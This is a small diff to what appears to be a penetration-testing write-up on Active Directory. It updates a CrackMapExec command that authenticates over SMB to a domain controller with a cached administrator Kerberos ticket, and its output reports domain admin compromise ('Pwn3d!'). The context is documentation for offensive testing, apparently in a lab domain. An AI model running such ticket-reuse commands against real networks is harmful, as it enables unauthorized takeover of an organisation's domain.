@@ -244,7 +244,7 @@ export KRB5CCNAME=admin.ccache
 ### CrackMapExec
 
 ```plain
-$ cme smb DC01PKI.offsec.nl -k          
+$ cme smb DC01PKI.offsec.nl --use-kcache         
 SMB         DC01PKI.offsec.nl 445    DC01PKI         [*] Windows Server 2019 Standard 17763 x64 (name:DC01PKI) (domain:offsec.nl) (signing:True) (SMBv1:True)
 SMB         DC01PKI.offsec.nl 445    DC01PKI         [+] offsec.nl\johnDomainAdmin (Pwn3d!)
 ```
